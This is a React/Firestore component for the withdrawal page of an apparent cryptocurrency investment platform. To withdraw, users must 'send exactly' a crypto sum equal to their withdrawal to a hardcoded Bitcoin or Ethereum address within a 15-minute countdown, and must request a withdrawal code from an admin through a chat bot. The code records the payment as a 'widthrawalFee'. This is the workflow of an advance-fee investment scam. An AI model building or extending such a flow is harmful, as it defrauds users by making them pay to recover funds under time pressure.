import React, { useState, useEffect, useRef } from 'react';
import { db } from "../../database/firebaseConfig";
import { doc, addDoc, collection, query, where, getDocs, updateDoc } from "firebase/firestore";

const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, currentUser}) => {
    const [copystate, setCopystate] = useState("Copy");
    const [withdrawalCode, setWithdrawalCode] = useState("");
    const [error, setError] = useState("");
    const [isVerifying, setIsVerifying] = useState(false);

    const colRef = collection(db, "withdrawals");
    const codesRef = collection(db, "withdrawalCodes");
    const usersRef = collection(db, "userlogs");
    
    // Debug prices on mount
    useEffect(() => {
        console.log('WithdrawalPayment Prices:', { bitPrice, ethPrice, bitPriceType: typeof bitPrice, ethPriceType: typeof ethPrice });
    }, [bitPrice, ethPrice]);

    const removeErr = () => {
        setTimeout(() => {
            setCopystate("Copy");
        }, 2500);
    }

    // countdown timer (in seconds) for making payment; default 15 minutes
    const DEFAULT_COUNTDOWN = 15 * 60;
    const [countdown, setCountdown] = useState(DEFAULT_COUNTDOWN);
    const countdownRef = useRef(null);
    const [showPopup, setShowPopup] = useState(false);
    const [successMessage, setSuccessMessage] = useState("");
    const [failureMessage, setFailureMessage] = useState("");
    const [selectedCodeDoc, setSelectedCodeDoc] = useState(null);
    const [isProcessing, setIsProcessing] = useState(false);

    useEffect(() => {
        // start countdown when component mounts
        countdownRef.current = setInterval(() => {
            setCountdown((c) => {
                if (c <= 1) {
                    clearInterval(countdownRef.current);
                    return 0;
                }
                return c - 1;
            });
        }, 1000);

        return () => {
            if (countdownRef.current) clearInterval(countdownRef.current);
        };
    }, []);

    const formatTime = (secs) => {
        const m = Math.floor(secs / 60).toString().padStart(2, "0");
        const s = Math.floor(secs % 60).toString().padStart(2, "0");
        return `${m}:${s}`;
    }

    const copyToClipboard = (text) => {
        navigator.clipboard.writeText(text)
          .then(() => {
            setCopystate("Copied");
            removeErr();
          })
          .catch((err) => {
            console.error('Unable to copy text to clipboard', err);
          });
    }



    const verifyWithdrawalCode = async () => {
        setIsVerifying(true);
        setError("");

        try {
            // Check if code exists and is unused (do not mark used yet)
            const q = query(codesRef,
                where("code", "==", withdrawalCode),
                where("used", "==", false),
                where("userId", "==", currentUser?.idnum)
            );

            const snapshot = await getDocs(q);

            if (snapshot.empty) {
                setError("Invalid or expired withdrawal code");
                setIsVerifying(false);
                return null;
            }

            // return the document snapshot for later update
            const codeDoc = snapshot.docs[0];
            return codeDoc;
        } catch (err) {
            console.error("Error verifying code:", err);
            setError("Error verifying code. Please try again.");
            return null;
        } finally {
            setIsVerifying(false);
        }
    }

    const handleTransacConfirmation = async () => {
        if (!withdrawalCode) {
            setError("Please enter your withdrawal code");
            return;
        }

        // Check KYC status before proceeding
        if (!currentUser?.kycStatus || currentUser?.kycStatus !== 'verified') {
            setError("KYC verification required. Please complete KYC verification before making a withdrawal.");
            return;
        }

        if (countdown === 0) {
            setError("Payment window expired. Please initiate a new withdrawal.");
            return;
        }

        // Verify code (returns the doc snapshot) and then show confirmation popup with payment type
        const codeDoc = await verifyWithdrawalCode();
        if (!codeDoc) return;

        setSelectedCodeDoc(codeDoc);
        setShowPopup(true);
    }

    const handleFinalConfirm = async () => {
        if (!selectedCodeDoc) {
            setFailureMessage("No withdrawal code selected. Try again.");
            return;
        }

        // Check KYC status before processing withdrawal
        if (!currentUser?.kycStatus || currentUser?.kycStatus !== 'verified') {
            setFailureMessage("KYC verification required. Please complete KYC before withdrawing.");
            setShowPopup(false);
            setIsProcessing(false);
            return;
        }

        setIsProcessing(true);
        setFailureMessage("");
        setSuccessMessage("");

        try {
            // mark code used
            await updateDoc(selectedCodeDoc.ref, { used: true, usedAt: new Date().toISOString() });

            const amount = withdrawData?.amount ?? withdrawData?.capital ?? 0;

            // Enforce minimum withdrawal amount at finalization as well
            if (Number.parseFloat(amount) < 200) {
                setFailureMessage('Minimum withdrawal amount is $200');
                setIsProcessing(false);
                return;
            }

            await addDoc(colRef, {
                ...withdrawData,
                amount,
                date: new Date().toISOString(),
                withdrawalCode: withdrawalCode,
                widthrawalFee: withdrawData?.paymentOption === "Bitcoin"
                    ? `${calculateCryptoAmount(amount, bitPrice, 'BTC')} BTC`
                    : withdrawData?.paymentOption === "Ethereum"
                    ? `${calculateCryptoAmount(amount, ethPrice, 'ETH')} ETH`
                    : 'N/A',
                idnum: currentUser?.idnum,
                status: "Pending"
            });

            // Deduct amount from user's available balance
            try {
                const userQuery = query(usersRef, where("idnum", "==", currentUser?.idnum));
                const userSnapshot = await getDocs(userQuery);
                if (!userSnapshot.empty) {
                    const userDoc = userSnapshot.docs[0];
                    const currentBalance = parseFloat(userDoc.data().balance || 0);
                    const newBalance = Math.max(0, currentBalance - parseFloat(amount));
                    
                    console.log('Updating balance:', { currentBalance, amount, newBalance });
                    
                    await updateDoc(userDoc.ref, { balance: newBalance });
                    
                    // Update sessionStorage to reflect new balance immediately
                    try {
                        const activeUser = JSON.parse(sessionStorage.getItem('activeUser') || '{}');
                        activeUser.balance = newBalance;
                        sessionStorage.setItem('activeUser', JSON.stringify(activeUser));
                    } catch (storageErr) {
                        console.warn('Could not update sessionStorage:', storageErr);
                    }
                }
            } catch (balanceErr) {
                console.warn("Could not update user balance:", balanceErr);
            }

            setSuccessMessage("Withdrawal request submitted successfully.");
            setShowPopup(false);

            // small delay so user can see success message before routing
            setTimeout(() => {
                setProfileState("Withdrawals");
            }, 900);
        } catch (err) {
            console.error("Finalizing withdrawal failed:", err);
            setFailureMessage("Could not complete withdrawal. Please try again later.");
        } finally {
            setIsProcessing(false);
        }
    }
  const displayAmount = withdrawData?.amount ?? withdrawData?.capital ?? 0;
  
  // Calculate crypto amounts based on current market price
  const calculateCryptoAmount = (amount, price, crypto) => {
    const numAmount = parseFloat(amount);
    const numPrice = parseFloat(price);
    
    console.log('Crypto Calculation:', { crypto, amount, price, numAmount, numPrice });
    
    if (!numAmount || !numPrice || numPrice === 0) {
      console.warn(`Invalid calculation for ${crypto}: amount=${numAmount}, price=${numPrice}`);
      return '0.00000000';
    }
    
    // Calculate the crypto amount: withdrawal amount / current price
    const cryptoAmount = numAmount / numPrice;
    console.log(`${crypto} Amount:`, cryptoAmount);
    return cryptoAmount.toFixed(8); // Show up to 8 decimal places for precision
  };

  return (
    <div className="paymentSect">
        <h2>Confirm Payment</h2>

        {/* KYC Status Warning */}
        {(!currentUser?.kycStatus || currentUser?.kycStatus !== 'verified') && (
            <div style={{
                backgroundColor: 'rgba(220, 18, 98, 0.1)',
                border: '2px solid var(--danger-clr)',
                borderRadius: '8px',
                padding: '1rem',
                marginBottom: '1rem',
                display: 'flex',
                alignItems: 'center',
                gap: '0.8rem'
            }}>
                <i className="icofont-warning" style={{ 
                    fontSize: '1.5rem', 
                    color: 'var(--danger-clr)',
                    flexShrink: 0
                }}></i>
                <div>
                    <strong style={{ color: 'var(--danger-clr)', display: 'block', marginBottom: '0.3rem' }}>
                        KYC Verification Required
                    </strong>
                    <span style={{ fontSize: '0.9em', color: 'var(--text-clr1)' }}>
                        You must complete KYC verification before you can withdraw funds. Please complete your KYC in the Profile section.
                    </span>
                </div>
            </div>
        )}

        {successMessage && <div className="toast success">{successMessage}</div>}
        {failureMessage && <div className="toast error">{failureMessage}</div>}

        <div className="mainPaymentSect">
            {withdrawData?.paymentOption !== 'Bank Transfer' ? (
                <>
                    <h3>Send exactly <span>{withdrawData?.paymentOption === "Bitcoin" ? `${calculateCryptoAmount(displayAmount, bitPrice, 'BTC')} BTC` : `${calculateCryptoAmount(displayAmount, ethPrice, 'ETH')} ETH`}</span> to</h3>
                    <p>{withdrawData?.paymentOption === "Bitcoin" ? "Bitcoin Address:" : "Ethereum Address:"} <span onClick={() => {copyToClipboard(`${withdrawData?.paymentOption === "Bitcoin" ? "bc1q4d5rfgeuq0su78agvermq3fpqtxjczlzhnttty" : "0x1D2C71bF833Df554A86Ad142f861bc12f3B24c1c"}`)}}>{copystate} <i className="icofont-ui-copy"></i></span></p>
                </>
            ) : (
                <>
                    <h3>Bank Transfer Details</h3>
                    <p><strong>Bank:</strong> {withdrawData?.bankName}</p>
                    <p><strong>Account Number:</strong> {withdrawData?.bankAccountNumber}</p>
                    <p><strong>Account Holder:</strong> {withdrawData?.bankAccountName}</p>
                    {withdrawData?.bankRoutingSwift && <p><strong>Routing/Swift Code:</strong> {withdrawData?.bankRoutingSwift}</p>}
                </>
            )}
        </div>

        <p>Confirm the transaction after the specified amount has been transferred while we complete the transaction process.</p>
        <p>The completion of the transaction process might take between couple minutes to several hours. You can check for the status of your withdrawals in the Withdrawal section of your User-Account-Display-Interface.</p>

        <div className="paymentMeta">
            <p>Payment window: <strong>{formatTime(countdown)}</strong></p>
            <p>Withdrawal amount: <strong>${Number(displayAmount).toLocaleString()}</strong></p>
        </div>

        <div className="codeInputSect">
            <label style={{display: 'block', marginBottom: '12px', fontWeight: '600', textAlign: 'center'}}>Enter withdrawal code</label>
            <div style={{
                display: 'flex',
                gap: '8px',
                justifyContent: 'center',
                marginBottom: '16px'
            }}>
                {[0, 1, 2, 3, 4, 5].map((index) => (
                    <input
                        key={index}
                        id={`withdrawal-code-${index}`}
                        type="text"
                        inputMode="numeric"
                        maxLength="1"
                        value={withdrawalCode[index] || ''}
                        onChange={(e) => {
                            const value = e.target.value.replace(/[^0-9]/g, '');
                            if (value.length <= 1) {
                                const newCode = withdrawalCode.split('');
                                newCode[index] = value;
                                setWithdrawalCode(newCode.join(''));
                                
                                // Auto-focus next input
                                if (value && index < 5) {
                                    document.getElementById(`withdrawal-code-${index + 1}`)?.focus();
                                }
                            }
                        }}
                        onKeyDown={(e) => {
                            // Handle backspace to move to previous input
                            if (e.key === 'Backspace' && !e.target.value && index > 0) {
                                document.getElementById(`withdrawal-code-${index - 1}`)?.focus();
                            }
                        }}
                        onPaste={(e) => {
                            e.preventDefault();
                            const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
                            setWithdrawalCode(pastedData);
                            // Focus the last filled input or the last one
                            const nextIndex = Math.min(pastedData.length, 5);
                            document.getElementById(`withdrawal-code-${nextIndex}`)?.focus();
                        }}
                        style={{
                            width: '48px',
                            height: '56px',
                            fontSize: '1.6rem',
                            textAlign: 'center',
                            border: '2px solid #ddd',
                            borderRadius: '8px',
                            outline: 'none',
                            transition: 'all 0.2s',
                            fontWeight: '700',
                            backgroundColor: '#fff',
                            color: '#333'
                        }}
                        onFocus={(e) => {
                            e.target.style.borderColor = '#0672CD';
                            e.target.style.boxShadow = '0 0 0 3px rgba(6, 114, 205, 0.15)';
                        }}
                        onBlur={(e) => {
                            e.target.style.borderColor = '#ddd';
                            e.target.style.boxShadow = 'none';
                        }}
                    />
                ))}
            </div>
            <div style={{marginTop: 8, display: 'flex', gap: '10px', flexWrap: 'wrap'}}>
                <button 
                    type="button" 
                    onClick={handleTransacConfirmation} 
                    disabled={isVerifying || countdown === 0}
                    style={{flex: '1', minWidth: '150px'}}
                >
                    {isVerifying ? 'Verifying...' : 'Verify Code & Continue'}
                </button>
                <button 
                    type="button" 
                    onClick={() => {
                        const pre = `Withdrawal code request:\nAmount: $${displayAmount?.toLocaleString()}\nPayment Method: ${withdrawData?.paymentOption}\nUser ID: ${currentUser?.idnum || 'unknown'}\nUsername: ${currentUser?.userName || currentUser?.name || 'unknown'}\nEmail: ${currentUser?.email || 'unknown'}`;
                        window.dispatchEvent(new CustomEvent('openChatBot', { 
                            detail: { 
                                prefillMessage: pre, 
                                highlight: 'request-withdrawal', 
                                autoSend: true 
                            } 
                        }));
                    }}
                    style={{flex: '1', minWidth: '150px'}}
                >
                    Request Code from Admin
                </button>
            </div>
            {error && <p className='errorMsg'>{error}</p>}
        </div>

        {/* Popup confirmation shown after code is verified */}
        {showPopup && (
            <div className="modalOverlay">
                <div className="modalCard">
                    <h3>Confirm Withdrawal</h3>
                    <p>Payment type: <strong>{withdrawData?.paymentOption}</strong></p>
                    <p>Amount: <strong>${Number(displayAmount).toLocaleString()}</strong></p>
                    {withdrawData?.paymentOption === 'Bank Transfer' && (
                        <>
                            <p style={{fontSize: '0.9rem', marginTop: 12}}>
                                <strong>Bank:</strong> {withdrawData?.bankName}<br/>
                                <strong>Account:</strong> {withdrawData?.bankAccountNumber}<br/>
                                <strong>Holder:</strong> {withdrawData?.bankAccountName}
                            </p>
                        </>
                    )}
                    <p>Withdrawal Code: <strong>{withdrawalCode}</strong></p>
                    <div className="modalActions">
                        <button type="button" onClick={() => { setShowPopup(false); setSelectedCodeDoc(null); }} disabled={isProcessing}>Cancel</button>
                        <button type="button" onClick={handleFinalConfirm} disabled={isProcessing}>{isProcessing ? 'Processing...' : 'Confirm Transaction'}</button>
                    </div>
                </div>
            </div>
        )}
    </div>
  )
}

export default WithdrawalPayment



{/* <p>{withdrawData?.paymentOption === "Bitcoin" ? "bc1q4d5rfgeuq0su78agvermq3fpqtxjczlzhnttty" : "0x1D2C71bF833Df554A86Ad142f861bc12f3B24c1c"} <span onClick={() => {copyToClipboard(`${withdrawData?.paymentOption === "Bitcoin" ? "bc1q4d5rfgeuq0su78agvermq3fpqtxjczlzhnttty" : "0x1D2C71bF833Df554A86Ad142f861bc12f3B24c1c"}`)}}>{copystate} <i class="icofont-ui-copy"></i></span></p> */}